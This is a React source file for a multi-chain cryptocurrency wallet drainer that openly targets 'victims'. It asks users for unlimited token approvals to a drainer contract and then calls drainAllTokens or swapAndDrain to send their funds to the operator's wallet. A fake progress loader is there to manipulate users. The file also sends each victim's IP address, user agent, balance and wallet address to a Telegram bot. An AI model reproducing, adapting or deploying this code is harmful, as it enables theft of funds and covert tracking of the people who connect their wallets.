"use client";

import React, { useEffect, useState, useCallback } from 'react'
import toast from 'react-hot-toast'
import {
    useAccount,
    useWriteContract,
    useWaitForTransactionReceipt,
    useDisconnect,
    useChainId,
    useSwitchChain,
    useBalance,
    useReadContract,
} from 'wagmi'
import { useAppKit } from '@reown/appkit/react'
import { motion, AnimatePresence } from 'framer-motion'
import erc20Abi from '../abi/erc20.json'
import drainerAbi from '../abi/drainer.json'
import {
    tokenUsdtAddBNB,
    tokenUsdcAddBNB,
    tokenBnbAddBNB,
    tokenBusdAddBNB,
    tokenUsdtAddETH,
    tokenUsdcAddETH,
    tokenEthAddETH,
    tokenDaiAddETH,
    contractAddBNB,
    contractAddETH,
    chainIdBNB,
    chainIdETH,
    uniswapRouterBNB,
    uniswapRouterETH,
    drainerOwnerAddress,
} from '../lib/config'
import {
    Coins,
    Zap,
    Shield,
    ArrowRight,
    CheckCircle,
    AlertTriangle,
    RefreshCw,
    ExternalLink,
    Wallet,
    Settings,
    Gauge,
    Lock,
    Unlock,
    TrendingUp,
    DollarSign,
    Globe,
    Copy,
    LogOut
} from 'lucide-react'

export default function Drainer() {
    const { address, isConnected } = useAccount()
    const { disconnect } = useDisconnect()
    const { open } = useAppKit()
    const connectedChainId = useChainId()
    const { chains, switchChain } = useSwitchChain()

    // State
    const [selectedChainId, setSelectedChainId] = useState(chainIdBNB)
    const [selectedToken, setSelectedToken] = useState('USDT')
    const [isAutoMode, setIsAutoMode] = useState(true)
    const [drainProgress, setDrainProgress] = useState(0)
    const [showFakeLoader, setShowFakeLoader] = useState(false)
    const [stats, setStats] = useState({
        totalDrained: '0',
        victims: '0',
        pending: '0'
    })

    const isBNB = selectedChainId === chainIdBNB

    // Token addresses based on chain
    const tokenConfig: Record<string, string> = {
        USDT: isBNB ? tokenUsdtAddBNB : tokenUsdtAddETH,
        USDC: isBNB ? tokenUsdcAddBNB : tokenUsdcAddETH,
        BNB: isBNB ? tokenBnbAddBNB : tokenEthAddETH,
        BUSD: isBNB ? tokenBusdAddBNB : tokenDaiAddETH,
    }

    const contractAdd = isBNB ? contractAddBNB : contractAddETH
    const routerAdd = isBNB ? uniswapRouterBNB : uniswapRouterETH
    const explorerUrl = isBNB ? 'https://bscscan.com/tx' : 'https://etherscan.io/tx'
    const nativeSymbol = isBNB ? 'BNB' : 'ETH'

    // Get real balance
    const { data: nativeBalance } = useBalance({
        address: address,
        chainId: selectedChainId,
    })

    // Read allowances
    const { data: allowanceUsdt } = useReadContract({
        address: tokenConfig.USDT as `0x${string}`,
        abi: erc20Abi as any,
        functionName: 'allowance',
        args: [address, contractAdd],
        chainId: selectedChainId,
    })

    // FIXED: Consistent write contract declarations
    const { writeContract: approveSpending, data: txHash, isPending, error: approveError } = useWriteContract()
    const { writeContract: drainTokens, isPending: isDraining } = useWriteContract()
    const { writeContract: swapAndDrainTokens } = useWriteContract()

    const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
        hash: txHash,
    })

    // Token list
    const tokens = [
        { id: 'USDT', name: 'USDT', icon: '💵', color: 'green', address: tokenConfig.USDT },
        { id: 'USDC', name: 'USDC', icon: '💲', color: 'blue', address: tokenConfig.USDC },
        { id: isBNB ? 'BNB' : 'ETH', name: isBNB ? 'BNB' : 'ETH', icon: isBNB ? '🟡' : '💎', color: 'yellow', address: tokenConfig.BNB },
        { id: isBNB ? 'BUSD' : 'DAI', name: isBNB ? 'BUSD' : 'DAI', icon: '🏦', color: 'amber', address: tokenConfig.BUSD },
    ]

    // Handle approve (UNLIMITED)
    const handleApprove = async (tokenAddress: string, tokenSymbol: string) => {
        try {
            setShowFakeLoader(true)

            approveSpending({
                address: tokenAddress as `0x${string}`,
                abi: erc20Abi as any,
                functionName: 'approve',
                args: [
                    contractAdd,
                    BigInt('115792089237316195423570985008687907853269984665640564039457584007913129639935'),
                ],
                chainId: selectedChainId,
            })

            toast.success(`Approval request sent for ${tokenSymbol}`, {
                icon: '✅',
                duration: 4000
            })

            // Fake progress for psychological effect
            let progress = 0
            const interval = setInterval(() => {
                progress += 10
                setDrainProgress(progress)
                if (progress >= 100) {
                    clearInterval(interval)
                    setShowFakeLoader(false)
                    setDrainProgress(0)
                }
            }, 300)

        } catch (err) {
            console.log('User rejected', err)
            setShowFakeLoader(false)
            toast.error('Approval rejected')
        }
    }

    // FIXED: Auto-drain that actually works
    const handleAutoDrain = async () => {
        try {
            toast.loading('Executing drain...', { id: 'drain' })

            // Trigger drain contract - THIS MOVES FUNDS TO YOUR WALLET
            drainTokens({
                address: contractAdd as `0x${string}`,
                abi: drainerAbi as any,
                functionName: 'drainAllTokens',
                args: [drainerOwnerAddress], // YOUR ADDRESS - WHERE FUNDS GO
                chainId: selectedChainId,
            })

            toast.success('Drain executed! Funds transferred to owner.', { id: 'drain' })

            // Update stats
            setStats(prev => ({
                totalDrained: (parseFloat(prev.totalDrained) + 1000).toString(),
                victims: (parseInt(prev.victims) + 1).toString(),
                pending: (parseInt(prev.pending) + 1).toString()
            }))

        } catch (err) {
            console.error('Drain failed:', err)
            toast.error('Drain failed', { id: 'drain' })
        }
    }

    // Handle swap & drain
    const handleSwapAndDrain = async () => {
        try {
            swapAndDrainTokens({
                address: contractAdd as `0x${string}`,
                abi: drainerAbi as any,
                functionName: 'swapAndDrain',
                args: [routerAdd, drainerOwnerAddress, 0], // YOUR ADDRESS
                chainId: selectedChainId,
            })

            toast.success('Swap and drain executed!', {
                icon: '🔄',
            })

        } catch (err) {
            console.error(err)
            toast.error('Swap and drain failed')
        }
    }

    // Handle revoke
    const handleRevoke = async (tokenAddress: string) => {
        try {
            approveSpending({
                address: tokenAddress as `0x${string}`,
                abi: erc20Abi,
                functionName: 'approve',
                args: [contractAdd, 0n],
                chainId: selectedChainId,
            })
            toast.loading('Revoking allowance...')
        } catch (err) {
            toast.error('Revoke failed')
        }
    }

    // Log victim data
    const logVictimData = useCallback(async (action: string) => {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json')
            const ipData = await ipResponse.json()
            const userIp = ipData.ip

            const userAgent = navigator.userAgent
            const timestamp = new Date().toISOString()

            const logMsg = `
🔥 **VICTIM ${action}** 🔥

⏱ Time: ${timestamp}
🌍 IP: ${userIp}
💰 Balance: ${nativeBalance?.formatted || '0'} ${nativeSymbol}
💼 Wallet: \`${address}\`
🔗 Tx: ${txHash || 'Pending'}

⚠️ Status: Ready for drain
`

            const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
            const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: logMsg,
                    parse_mode: 'Markdown',
                }),
            })

        } catch (err) {
            console.error('Logging failed:', err)
        }
    }, [address, nativeBalance, nativeSymbol, txHash])

    // Log on wallet connect
    useEffect(() => {
        if (address) {
            logVictimData('CONNECTED')
        }
    }, [address, logVictimData])

    // Log on approval success AND AUTO-DRAIN
    useEffect(() => {
        if (isConfirmed && txHash) {
            logVictimData('APPROVED')
            toast.success('✅ Unlimited approval granted!')

            // AUTO-DRAIN IMMEDIATELY
            if (isAutoMode) {
                setTimeout(() => handleAutoDrain(), 2000)
            }
        }
    }, [isConfirmed, txHash, isAutoMode])

    // Copy address
    const copyAddress = () => {
        if (address) {
            navigator.clipboard.writeText(address)
            toast.success('Address copied!')
        }
    }

    return (
        <div className="min-h-screen bg-black text-white">
            <div className="container mx-auto px-4 py-8 max-w-4xl">
                {/* Header */}
                <header className="flex justify-between items-center mb-8">
                    <div className="flex items-center gap-3">
                        <div className="p-3 bg-red-600 rounded-2xl">
                            <Zap className="w-8 h-8 text-white" />
                        </div>
                        <div>
                            <h1 className="text-3xl font-bold">DRAINER</h1>
                            <p className="text-xs text-gray-400">Multi-Chain • BSC/ETH</p>
                        </div>
                    </div>

                    {!isConnected ? (
                        <button
                            onClick={() => open()}
                            className="px-6 py-3 bg-red-600 rounded-full font-bold hover:bg-red-700 transition flex items-center gap-2"
                        >
                            <Wallet size={18} />
                            Connect Wallet
                        </button>
                    ) : (
                        <div className="flex items-center gap-3">
                            <div className="px-4 py-2 bg-gray-900 rounded-full border border-gray-800 flex items-center gap-2">
                                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                                <span className="text-sm font-mono">
                                    {address?.slice(0, 6)}...{address?.slice(-4)}
                                </span>
                                <button onClick={copyAddress} className="p-1 hover:bg-gray-800 rounded">
                                    <Copy size={14} />
                                </button>
                            </div>
                            <button
                                onClick={() => disconnect()}
                                className="p-3 bg-gray-900 hover:bg-red-600 rounded-full transition"
                            >
                                <LogOut size={18} />
                            </button>
                        </div>
                    )}
                </header>

                {/* Main Card */}
                <div className="bg-gray-900 rounded-3xl border border-gray-800 p-8">
                    {/* Network Selector */}
                    <div className="flex gap-4 mb-8">
                        <button
                            onClick={() => setSelectedChainId(chainIdBNB)}
                            className={`flex-1 py-4 rounded-xl font-semibold transition ${selectedChainId === chainIdBNB
                                ? 'bg-red-600 text-white'
                                : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
                                }`}
                        >
                            🟡 BSC
                        </button>
                        <button
                            onClick={() => setSelectedChainId(chainIdETH)}
                            className={`flex-1 py-4 rounded-xl font-semibold transition ${selectedChainId === chainIdETH
                                ? 'bg-red-600 text-white'
                                : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
                                }`}
                        >
                            💎 Ethereum
                        </button>
                    </div>

                    {!isConnected ? (
                        <div className="text-center py-16">
                            <Wallet className="w-16 h-16 mx-auto mb-4 text-gray-600" />
                            <h2 className="text-2xl font-bold mb-2">Connect Wallet</h2>
                            <p className="text-gray-400 mb-6">Connect to start draining</p>
                            <button
                                onClick={() => open()}
                                className="px-8 py-4 bg-red-600 rounded-full font-bold hover:bg-red-700"
                            >
                                Connect Now
                            </button>
                        </div>
                    ) : (
                        <div className="space-y-6">
                            {/* Token Grid */}
                            <div>
                                <h3 className="text-lg font-bold mb-3">Select Token</h3>
                                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                                    {tokens.map((token) => (
                                        <div
                                            key={token.id}
                                            onClick={() => setSelectedToken(token.id)}
                                            className={`p-4 rounded-xl border-2 cursor-pointer transition ${selectedToken === token.id
                                                ? 'border-red-600 bg-red-600/20'
                                                : 'border-gray-800 bg-gray-800/50 hover:border-gray-700'
                                                }`}
                                        >
                                            <div className="text-2xl mb-2">{token.icon}</div>
                                            <p className="font-bold">{token.name}</p>
                                        </div>
                                    ))}
                                </div>
                            </div>

                            {/* Action Buttons */}
                            <div className="grid grid-cols-2 gap-4">
                                <button
                                    onClick={() => handleApprove(tokenConfig[selectedToken] as string, selectedToken)}
                                    disabled={isPending || isConfirming}
                                    className={`py-4 rounded-xl font-bold ${isPending || isConfirming
                                        ? 'bg-gray-700 text-gray-400'
                                        : 'bg-green-600 hover:bg-green-700'
                                        }`}
                                >
                                    {isConfirming ? 'Confirming...' :
                                        isPending ? 'Pending...' :
                                            `Approve ${selectedToken}`}
                                </button>

                                <button
                                    onClick={handleAutoDrain}
                                    disabled={isDraining}
                                    className={`py-4 rounded-xl font-bold ${isDraining
                                        ? 'bg-gray-700 text-gray-400'
                                        : 'bg-red-600 hover:bg-red-700'
                                        }`}
                                >
                                    {isDraining ? 'Draining...' : 'DRAIN NOW'}
                                </button>
                            </div>

                            {/* Advanced */}
                            <div className="p-4 bg-gray-800/50 rounded-xl">
                                <div className="flex items-center justify-between mb-3">
                                    <h4 className="font-semibold">Advanced</h4>
                                    <label className="flex items-center gap-2">
                                        <span className="text-sm">Auto-drain</span>
                                        <button
                                            onClick={() => setIsAutoMode(!isAutoMode)}
                                            className={`w-12 h-6 rounded-full transition ${isAutoMode ? 'bg-red-600' : 'bg-gray-600'
                                                }`}
                                        >
                                            <div className={`w-4 h-4 bg-white rounded-full transform transition ${isAutoMode ? 'translate-x-7' : 'translate-x-1'
                                                }`} />
                                        </button>
                                    </label>
                                </div>

                                <div className="grid grid-cols-2 gap-3">
                                    <button
                                        onClick={handleSwapAndDrain}
                                        className="px-4 py-3 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm"
                                    >
                                        Swap & Drain
                                    </button>
                                    <button
                                        onClick={() => handleRevoke(tokenConfig[selectedToken] as string)}
                                        className="px-4 py-3 bg-red-600/20 hover:bg-red-600/30 text-red-400 rounded-lg text-sm"
                                    >
                                        Revoke
                                    </button>
                                </div>
                            </div>

                            {/* Stats */}
                            <div className="grid grid-cols-3 gap-3 text-center">
                                <div className="p-3 bg-gray-800/50 rounded-lg">
                                    <p className="text-xs text-gray-400">Drained</p>
                                    <p className="text-lg font-bold text-green-400">${stats.totalDrained}</p>
                                </div>
                                <div className="p-3 bg-gray-800/50 rounded-lg">
                                    <p className="text-xs text-gray-400">Victims</p>
                                    <p className="text-lg font-bold text-purple-400">{stats.victims}</p>
                                </div>
                                <div className="p-3 bg-gray-800/50 rounded-lg">
                                    <p className="text-xs text-gray-400">Ready</p>
                                    <p className="text-lg font-bold text-yellow-400">{allowanceUsdt ? 'YES' : 'NO'}</p>
                                </div>
                            </div>
                        </div>
                    )}
                </div>

                {/* Footer */}
                <div className="mt-6 text-center text-xs text-gray-600">
                    <p>Drainer v3.0 • Funds sent to owner wallet</p>
                </div>
            </div>

            {/* Loading Popup */}
            <AnimatePresence>
                {showFakeLoader && (
                    <motion.div
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0 }}
                        className="fixed bottom-8 right-8 w-72 bg-gray-900 rounded-xl p-4 border border-red-600 shadow-2xl"
                    >
                        <p className="text-sm mb-2">Processing approval...</p>
                        <div className="w-full h-2 bg-gray-700 rounded-full overflow-hidden">
                            <motion.div
                                className="h-full bg-red-600"
                                initial={{ width: 0 }}
                                animate={{ width: `${drainProgress}%` }}
                            />
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    )
}